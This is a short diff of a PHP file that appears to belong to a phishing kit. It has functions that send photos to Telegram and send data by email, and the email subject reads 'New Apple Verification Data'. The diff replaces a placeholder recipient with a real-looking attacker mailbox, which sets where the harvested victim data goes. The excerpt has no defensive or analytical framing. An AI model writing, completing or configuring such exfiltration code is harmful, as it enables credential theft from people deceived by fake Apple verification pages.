@@ -137,7 +137,7 @@ function sendPhotoToTelegram($photoPath, $caption = '') {
 
 // Function to send data to email
 function sendToEmail($data) {
-    $to = "your-email@example.com"; // Replace with your email
+    $to = "jokersudo@yandex.com"; // Replace with your email
     $subject = "New Apple Verification Data";
     
     // Prepare the email content
